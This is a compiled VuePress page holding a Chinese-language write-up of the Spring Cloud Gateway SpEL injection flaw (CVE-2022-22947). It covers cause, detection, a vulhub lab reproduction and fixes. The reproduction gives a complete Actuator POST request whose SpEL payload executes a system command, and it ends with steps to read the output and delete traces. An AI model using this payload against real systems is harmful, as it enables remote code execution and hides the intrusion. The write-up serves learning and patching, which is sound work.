import{_ as n,W as r,X as l,Y as e,Z as a,a0 as s,a1 as t,C as o}from"./framework-b6a07282.js";const d="/assets/1-aa477c62.jpg",u="/assets/2-b4437f50.jpg",c="/assets/3-6062213e.png",h="/assets/4-fd529a16.png",p="/assets/5-4c233bae.png",g="/assets/6-0512eaac.png",m="/assets/7-5c5ad4f1.png",v={},_=t('<h2 id="spring-cloud-gateway-rce漏洞" tabindex="-1"><a class="header-anchor" href="#spring-cloud-gateway-rce漏洞" aria-hidden="true">#</a> Spring Cloud Gateway RCE漏洞</h2><h3 id="_1-该漏洞是什么" tabindex="-1"><a class="header-anchor" href="#_1-该漏洞是什么" aria-hidden="true">#</a> 1.该漏洞是什么？</h3><ul><li>Spring Cloud Gateway RCE（CVE-2022-22947）漏洞是指当Spring Cloud Gateway应用程序启用、暴露和不安全Actuator端点时，攻击者就可以通过Actuator对Gateway添加过滤器（Filter），在里面写入恶意代码，从而达到RCE的目的。</li></ul><h4 id="影响范围" tabindex="-1"><a class="header-anchor" href="#影响范围" aria-hidden="true">#</a> 影响范围</h4><ul><li><p>SpringCloud Gateway 3.1.0</p></li><li><p>SpringCloud Gateway 3.0.0=3.0.6</p></li><li><p>必须开启Actuator接口</p></li></ul><h3 id="_2-漏洞的发生原因是什么" tabindex="-1"><a class="header-anchor" href="#_2-漏洞的发生原因是什么" aria-hidden="true">#</a> 2.漏洞的发生原因是什么？</h3><ul><li>这个漏洞发生的原因是Spring Cloud Gateway在处理Actuator端点的请求时，没有对用户输入的数据进行有效的过滤和校验，导致攻击者可以通过构造特殊的JSON数据，利用Spring Expression Language (SpEL) 的特性，修改filters或predicates字段中的值，从而插入恶意的SpEL表达式，执行任意代码。</li></ul><h3 id="_3-如何发现是否存在这个漏洞" tabindex="-1"><a class="header-anchor" href="#_3-如何发现是否存在这个漏洞" aria-hidden="true">#</a> 3.如何发现是否存在这个漏洞？</h3><ol><li>通过输入url，查看目标主机是否开放了Actuator端点 默认为/actuator/gateway</li><li>使用burpsuite拦截并向/actuator/gateway/routes发送请求信息，并且构造恶意的SpEL表达式。查看是否执行。</li></ol><h3 id="_4-该漏洞会造成什么危害" tabindex="-1"><a class="header-anchor" href="#_4-该漏洞会造成什么危害" aria-hidden="true">#</a> 4.该漏洞会造成什么危害？</h3><ul><li>远程代码执行（RCE）</li></ul><h3 id="_5-如何利用这个漏洞" tabindex="-1"><a class="header-anchor" href="#_5-如何利用这个漏洞" aria-hidden="true">#</a> 5.如何利用这个漏洞？</h3><h4 id="cve-2022-22947漏洞复现" tabindex="-1"><a class="header-anchor" href="#cve-2022-22947漏洞复现" aria-hidden="true">#</a> CVE-2022-22947漏洞复现</h4><h5 id="vulhub复现" tabindex="-1"><a class="header-anchor" href="#vulhub复现" aria-hidden="true">#</a> vulhub复现</h5><ol><li>抓包修改GET /actuator请求，确定actuator端口已经开启</li></ol><img src="'+d+'">',16),b={start:"2"},q={href:"http://example.com:80",target:"_blank",rel:"noopener noreferrer"},f=t('<img src="'+u+`"><ol start="3"><li>构造一个post请求包，POST /actuator/gateway/routes/test 添加一个包含恶意SpEL表达式的路由，注意要加入Content-Type类型</li></ol><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /actuator/gateway/routes/test  HTTP/1.1
Host: 192.168.1.130:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/json
Connection: close
Upgrade-Insecure-Requests: 1
If-Modified-Since: Thu, 17 Oct 2019 07:18:26 GMT
If-None-Match: &quot;3147526947&quot;
Content-Length: 329

{
  &quot;id&quot;: &quot;test&quot;,
  &quot;filters&quot;: [{
    &quot;name&quot;: &quot;AddResponseHeader&quot;,
    &quot;args&quot;: {
      &quot;name&quot;: &quot;Result&quot;,
      &quot;value&quot;: &quot;#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\&quot;whoami\\&quot;}).getInputStream()))}&quot;
    }
  }],
  &quot;uri&quot;: &quot;http://example.com&quot;
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><img src="`+c+'"><ol start="4"><li>刷新路由，POST /actuator/gateway/refresh</li></ol><img src="'+h+'"><ol start="5"><li>获取路由信息GET /actuator/gateway/routes/，新增路由test成功。</li></ol><img src="'+p+'"><ol start="6"><li>构造get请求，查看test路由信息，GET /actuator/gateway/routes/test,检索结果命令执行结果，当前用户为root ：</li></ol><img src="'+g+'"><ol start="7"><li>删除痕迹，将前面构造的路由删除,DELETE /actuator/gateway/routes/test。（执行上述第四步，刷新一遍后就看不到了）</li></ol><img src="'+m+'"><h3 id="_6-如何修复-防御这个漏洞" tabindex="-1"><a class="header-anchor" href="#_6-如何修复-防御这个漏洞" aria-hidden="true">#</a> 6.如何修复/防御这个漏洞？</h3><ol><li>升级 Spring Cloud Gateway &gt;=3.1.1 SpringCloud Gateway &gt;= 3.0.7</li><li>在考虑不影响业务的情况下禁用Actuator接口 management.endpoint.gateway.enable:false</li></ol><h3 id="_7-在有防御措施的情况下-如何绕过防御" tabindex="-1"><a class="header-anchor" href="#_7-在有防御措施的情况下-如何绕过防御" aria-hidden="true">#</a> 7.在有防御措施的情况下，如何绕过防御？</h3><ul><li>暂无</li></ul><h3 id="补充知识" tabindex="-1"><a class="header-anchor" href="#补充知识" aria-hidden="true">#</a> 补充知识</h3><ul><li>Spring Cloud Gateway主要作用是将Web URL路由到所对应的微服务API，具备许多功能，如智能路由、负载均衡、协议转换、权限校验、限流熔断、黑白名单、API监控、日志审计。</li><li>Spring Cloud Gateway上可以配置：路由（Route）、断言（Predicate）和过滤器（Filter），此漏洞就是添加过滤器（Filter）触发的。</li><li>Spring Boot Actuator负责对spring的其他组件进行监控和管理，包括健康检查、审计、统计和HTTP追踪等。</li></ul>',18);function x(w,y){const i=o("ExternalLinkIcon");return r(),l("div",null,[_,e("ol",b,[e("li",null,[a("修改get请求，获取路由信息GET /actuator/gateway/routes/。当前只有路由index,该路由默认跳转到uri:"),e("a",q,[a("http://example.com:80"),s(i)])])]),f])}const C=n(v,[["render",x],["__file","Spring Cloud Gateway RCE漏洞.html.vue"]]);export{C as default};
